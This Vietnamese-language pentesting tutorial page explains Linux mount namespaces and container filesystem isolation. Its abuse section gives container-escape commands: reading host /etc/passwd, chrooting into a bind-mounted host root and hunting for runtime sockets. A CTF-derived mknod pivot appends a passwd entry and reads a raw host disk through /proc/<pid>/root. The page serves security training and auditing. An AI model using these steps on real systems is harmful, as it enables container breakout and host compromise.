# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Tổng quan

Mount namespace kiểm soát **bảng mount** mà một tiến trình nhìn thấy. Đây là một trong những tính năng cô lập container quan trọng nhất vì filesystem gốc, bind mount, mount tmpfs, chế độ xem procfs, mức độ hiển thị của sysfs và nhiều mount hỗ trợ riêng cho runtime đều được thể hiện thông qua bảng mount đó. Hai tiến trình có thể cùng truy cập `/`, `/proc`, `/sys` hoặc `/tmp`, nhưng các đường dẫn đó trỏ đến đâu phụ thuộc vào mount namespace mà chúng đang ở trong đó.

Xét về bảo mật container, mount namespace thường là yếu tố quyết định giữa “đây là một filesystem ứng dụng được chuẩn bị gọn gàng” và “tiến trình này có thể trực tiếp nhìn thấy hoặc tác động đến filesystem của host”. Đó là lý do bind mount, volume `hostPath`, thao tác mount có đặc quyền và việc để lộ `/proc` hoặc `/sys` có quyền ghi đều liên quan đến namespace này.

## Cách hoạt động

Khi runtime khởi chạy một container, nó thường tạo một mount namespace mới, chuẩn bị filesystem gốc cho container, mount procfs và các filesystem hỗ trợ khác khi cần, sau đó tùy chọn thêm bind mount, mount tmpfs, secrets, config maps hoặc đường dẫn của host. Khi tiến trình chạy bên trong namespace, tập hợp các mount mà nó nhìn thấy phần lớn không còn phụ thuộc vào chế độ xem mặc định của host. Host vẫn có thể nhìn thấy filesystem nền thực sự, nhưng container nhìn thấy phiên bản do runtime tập hợp cho nó.

Điều này rất hữu ích vì container có thể tin rằng nó có filesystem gốc riêng, dù host vẫn đang quản lý mọi thứ. Tuy nhiên, điều này cũng nguy hiểm vì nếu runtime để lộ nhầm một mount, tiến trình đột nhiên có thể nhìn thấy các tài nguyên của host mà những phần khác trong mô hình bảo mật có thể chưa được thiết kế để bảo vệ.

## Lab

Bạn có thể tạo một mount namespace riêng bằng:

```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```

Nếu mở một shell khác bên ngoài namespace đó và kiểm tra mount table, bạn sẽ thấy mount tmpfs chỉ tồn tại bên trong mount namespace bị cô lập. Đây là một bài thực hành hữu ích vì nó cho thấy mount isolation không phải lý thuyết trừu tượng; kernel thực sự cung cấp một mount table khác cho tiến trình.
Nếu mở một shell khác bên ngoài namespace đó và kiểm tra mount table, mount tmpfs sẽ chỉ tồn tại bên trong mount namespace bị cô lập.

Bên trong các container, có thể so sánh nhanh như sau:

```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```

Ví dụ thứ hai cho thấy cấu hình runtime có thể dễ dàng tạo ra một lỗ hổng lớn xuyên qua ranh giới filesystem như thế nào.

## Cách sử dụng runtime

Docker, Podman, các stack dựa trên containerd và CRI-O đều dựa vào mount namespace riêng cho các container thông thường. Kubernetes xây dựng dựa trên cùng cơ chế này cho volume, secret được chiếu vào container, config map và mount `hostPath`. Các môi trường Incus/LXC cũng phụ thuộc nhiều vào mount namespace, đặc biệt vì system container thường hiển thị filesystem phong phú và giống máy chủ hơn application container.

Điều này có nghĩa là khi kiểm tra sự cố về filesystem của container, bạn thường không xử lý một lỗi riêng của Docker. Bạn đang xử lý vấn đề về mount namespace và cấu hình runtime, được thể hiện thông qua nền tảng đã khởi chạy workload.

## Cấu hình sai

Sai lầm rõ ràng và nguy hiểm nhất là để lộ filesystem gốc của host hoặc một đường dẫn nhạy cảm khác của host thông qua bind mount, chẳng hạn `-v /:/host` hoặc `hostPath` có quyền ghi trong Kubernetes. Lúc này, câu hỏi không còn là "container có cách nào đó thoát ra không?" mà là "những nội dung hữu ích nào trên host đã có thể được xem và ghi trực tiếp?" Bind mount host có quyền ghi thường khiến phần còn lại của exploit chỉ còn là vấn đề đặt file, chroot, sửa đổi cấu hình hoặc tìm runtime socket.

Một vấn đề phổ biến khác là để lộ `/proc` hoặc `/sys` của host theo cách vượt qua chế độ xem an toàn hơn dành cho container. Đây không phải các mount dữ liệu thông thường; chúng là giao diện truy cập trạng thái kernel và process. Nếu workload truy cập trực tiếp các phiên bản trên host, nhiều giả định làm nền tảng cho việc hardening container sẽ không còn được áp dụng một cách chặt chẽ.

Các biện pháp bảo vệ chỉ đọc cũng rất quan trọng. Filesystem gốc chỉ đọc không thể tự động bảo vệ container, nhưng nó loại bỏ nhiều không gian để attacker chuẩn bị các bước tiếp theo, đồng thời khiến việc duy trì hiện diện, đặt helper binary và sửa đổi cấu hình trở nên khó khăn hơn. Ngược lại, filesystem gốc có quyền ghi hoặc bind mount host có quyền ghi sẽ tạo điều kiện để attacker chuẩn bị bước tiếp theo.

## Lạm dụng

Khi mount namespace bị sử dụng sai, attacker thường làm một trong bốn việc. Họ **đọc dữ liệu trên host** vốn phải nằm ngoài container. Họ **sửa đổi cấu hình host** thông qua bind mount có quyền ghi. Họ **mount hoặc remount thêm tài nguyên** nếu capability và seccomp cho phép. Hoặc họ **truy cập các socket mạnh và thư mục trạng thái runtime**, qua đó yêu cầu chính nền tảng container cấp thêm quyền truy cập.

Nếu container đã có thể nhìn thấy filesystem của host, mô hình bảo mật sẽ thay đổi ngay lập tức.

Khi nghi ngờ có bind mount host, trước tiên hãy xác nhận những gì có thể truy cập và liệu các mục đó có quyền ghi hay không:

```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```

Nếu root filesystem của host được mount ở chế độ read-write, việc truy cập trực tiếp vào host thường đơn giản như sau:

```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```

Nếu mục tiêu là quyền truy cập runtime đặc quyền thay vì chrooting trực tiếp, hãy liệt kê các socket và trạng thái runtime:

```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```

Nếu có `CAP_SYS_ADMIN`, hãy kiểm tra thêm xem có thể tạo mount mới từ bên trong container hay không:

```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```

### Ví dụ đầy đủ: Two-Shell `mknod` Pivot

Một đường khai thác chuyên biệt hơn xuất hiện khi người dùng root trong container có thể tạo thiết bị khối, host và container dùng chung một danh tính người dùng theo cách hữu ích, và kẻ tấn công đã có foothold với quyền thấp trên host. Trong tình huống đó, container có thể tạo một node thiết bị như `/dev/sda`, rồi người dùng host có quyền thấp có thể đọc nó qua `/proc/<pid>/root/` của tiến trình container tương ứng.<sup>[[1]](#references)</sup>

Bên trong container:

```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```

Từ host, với tư cách người dùng ít đặc quyền tương ứng, sau khi xác định PID của shell trong container:

```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```

Bài học quan trọng không nằm ở việc tìm kiếm chính xác chuỗi CTF. Mà là việc để lộ mount namespace thông qua `/proc/<pid>/root/` có thể cho phép người dùng trên host sử dụng lại các device node do container tạo ra, ngay cả khi chính sách thiết bị của cgroup đã ngăn việc sử dụng trực tiếp bên trong container.<sup>[[1]](#references)</sup>

## Checks

Các lệnh này nhằm cho bạn thấy chế độ xem filesystem mà tiến trình hiện tại thực sự đang hoạt động trong đó. Mục tiêu là phát hiện các mount có nguồn gốc từ host, những đường dẫn nhạy cảm có quyền ghi và bất cứ thứ gì có vẻ rộng hơn root filesystem của một application container thông thường.

```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```

Điều gì đáng chú ý ở đây:

- Bind mounts từ host, đặc biệt là `/`, `/proc`, `/sys`, các thư mục lưu trạng thái runtime hoặc vị trí socket, cần được chú ý ngay lập tức.
- Các mount đọc-ghi bất ngờ thường quan trọng hơn nhiều so với số lượng lớn mount hỗ trợ chỉ đọc.
- `mountinfo` thường là nơi tốt nhất để xác định một đường dẫn thực sự bắt nguồn từ host hay được hỗ trợ bởi overlay.

Các bước kiểm tra này xác định **những tài nguyên nào hiển thị trong namespace này**, **tài nguyên nào bắt nguồn từ host** và **tài nguyên nào có thể ghi hoặc nhạy cảm về bảo mật**.

## References

- [1] [Khi container nói dối: Thoát khỏi quyền root và phá vỡ cơ chế cô lập của Docker](https://www.kayssel.com/post/docker-security-2/)
{{#include ../../../../../banners/hacktricks-training.md}}
